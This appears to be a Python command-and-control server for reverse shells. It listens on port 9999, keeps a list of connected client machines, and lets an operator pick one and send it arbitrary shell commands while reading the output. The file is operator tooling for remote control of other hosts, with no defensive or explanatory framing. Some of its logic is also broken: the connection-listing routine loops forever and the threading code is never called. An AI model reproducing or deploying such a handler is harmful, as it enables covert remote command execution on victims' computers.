from threading import Thread
from queue import Queue
import socket
import sys

bindCount = 0
THREAD_NUM = 2
JOB_NUM = [1, 2]
queue = Queue()

ALL_CONN = []
ALL_ADDR = []

def send_command(conn):
    while True:
        cmd = input('[ $ ] Client | ')
        if cmd == 'quit':
            for c in ALL_CONN:
                c.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(f'[ $ ] Client | {client_response}', end="\n")


# Create connection
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
        print(f'[ + ] Server created | {str(port)}')
    except socket.error as msg:
        print(f'[ - ] Creation failed | {str(msg)}')


# Bind connection
def socket_bind():
    try:
        global host
        global port
        global s
        print(f'[ + ] Binding connection | {str(port)}')
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        global bindCount
        if bindCount < 3:
            print(f'[ - ] Connection binding error | {str(msg)}')
            print(f'[ - ] Reattempting to bind connection...')
            bindCount += 1
            socket_bind()
        else:
            bindCount = 0
            print(f'[ - ] Failed to bind connection')
            s.close()


# Establish connection
def socket_accept():
    conn, addr = s.accept()
    print(f'[ + ] Connection establisted | {str(addr[0])}, {str(addr[1])}')
    send_command(conn)
    conn.close()


# Accept all connections
def accept_conns():
        for c in ALL_CONN: c.close()
        del ALL_CONN[:], ALL_ADDR[:]
        while True:
            try:
                conn, addr = s.accept()
                conn.setblocking(1)
                ALL_CONN.append(conn)
                ALL_ADDR.append(addr)
            except:
                continue


# Display Connections
def list_conns():
    res = ''
    accept_conns()
    for i, c in enumerate(ALL_CONN):
        try:
            c.send(str.encode(' '))
            c.recv(20480)
        except:
            del ALL_CONN[i]
            del ALL_ADDR[i]
            continue
        res += f'{str(i)}   {str(ALL_ADDR[i][0])}   {str(ALL_ADDR[i][1])}\n'
    print(f'[ -=- ] Clients [ -=- ]\n{res}')


def get_client(cmd):
    try:
        cli = cmd.replace('bind ', '')
        cli = int(cli)
        conn = ALL_CONN[cli]
        print(f'[ $ ] Connected to client | {str(ALL_ADDR[cli][0])}')
        return conn
    except:
        print(f'[ $ ] Invalid ID')
        return None


# Connect to Client
def send_client_command(conn):
    while True:
        try:
            cmd = input(f'[ $ ] Client | ')
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response)
            if cmd == 'quit':
                break
        except:
            print(f'[ $ ] Lost connection')
            break


# Create Threads
def create_thread():
    for _ in range(THREAD_NUM):
        t = Thread(target=work)
        t.daemon = True
        t.start()


# Execute queued job
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            socket_accept()
        if x == 2:
            start_shell()
        queue.task_done()


# Create jobs
def create_jobs():
    for x in JOB_NUM:
        queue.put(x)
    queue.join()


# Shell
def start_shell():
        while True:
            cmd = input('[ $ ] Server | ')
            if cmd == 'list':
                list_conns()
            elif 'quit' in cmd:
                for c in ALL_CONN:
                    c.close()
                    s.close()
            elif 'bind' in cmd.lower():
                conn = get_client(cmd)
                if conn is not None:
                    send_client_command(conn)
            else:
                print(f'[ $ ] Invalid command')

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
    
